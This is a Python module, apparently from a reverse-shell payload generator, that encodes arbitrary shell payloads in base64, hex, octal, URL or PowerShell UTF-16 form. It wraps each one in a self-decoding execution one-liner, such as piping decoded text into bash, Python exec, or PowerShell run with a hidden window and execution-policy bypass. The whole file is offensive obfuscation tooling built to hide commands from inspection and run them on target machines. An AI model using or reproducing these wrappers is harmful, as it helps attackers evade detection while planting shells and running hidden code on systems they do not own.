import base64
import urllib.parse
from typing import Optional


class Encoders:
    SUPPORTED = ['none', 'base64', 'url', 'hex', 'octal', 'ps_base64']

    @staticmethod
    def to_base64(payload: str) -> str:
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def to_url(payload: str) -> str:
        return urllib.parse.quote(payload)

    @staticmethod
    def to_hex(payload: str) -> str:
        return payload.encode().hex()

    @staticmethod
    def to_octal(payload: str) -> str:
        return ''.join(f'\\{oct(b)[2:]}' for b in payload.encode())

    @staticmethod
    def to_powershell_base64(payload: str) -> str:
        utf16 = payload.encode('utf-16-le')
        return base64.b64encode(utf16).decode()

    @classmethod
    def smart_wrap(cls, payload: str, encoder_type: str, shell_type: str) -> str:
        et = encoder_type.lower()
        st = shell_type.lower().split('_')[0]

        if et == 'none':
            return payload

        if et == 'base64':
            b64 = cls.to_base64(payload)
            if st in ('bash', 'nc', 'telnet', 'perl', 'ruby', 'php', 'java'):
                return f'printf {b64} | base64 -d | bash'
            if st == 'python':
                return f"python3 -c \"exec(__import__('base64').b64decode('{b64}').decode())\""
            if st == 'powershell':
                psb64 = cls.to_powershell_base64(payload)
                return f'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {psb64}'
            return f'printf {b64} | base64 -d | bash'

        if et == 'ps_base64':
            psb64 = cls.to_powershell_base64(payload)
            return f'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {psb64}'

        if et == 'hex':
            hexstr = cls.to_hex(payload)
            if st == 'python':
                return f"python3 -c \"exec(bytes.fromhex('{hexstr}').decode())\""
            if st == 'powershell':
                return (
                    f'powershell -c "'
                    f"$h='{hexstr}';"
                    f"$b=[System.Convert]::FromHexString($h);"
                    f'iex([System.Text.Encoding]::UTF8.GetString($b))"'
                )
            return (
                f"printf '%b' \"$(printf '{hexstr}' | sed 's/../\\\\x&/g')\" | bash"
            )

        if et == 'url':
            urlenc = cls.to_url(payload)
            if st == 'python':
                return (
                    f"python3 -c \""
                    f"import urllib.parse;"
                    f"exec(urllib.parse.unquote('{urlenc}'))\""
                )
            return f"python3 -c \"import urllib.parse,os;exec(urllib.parse.unquote('{urlenc}'))\""

        if et == 'octal':
            octal = cls.to_octal(payload)
            return f"printf \"{octal}\" | bash"

        return payload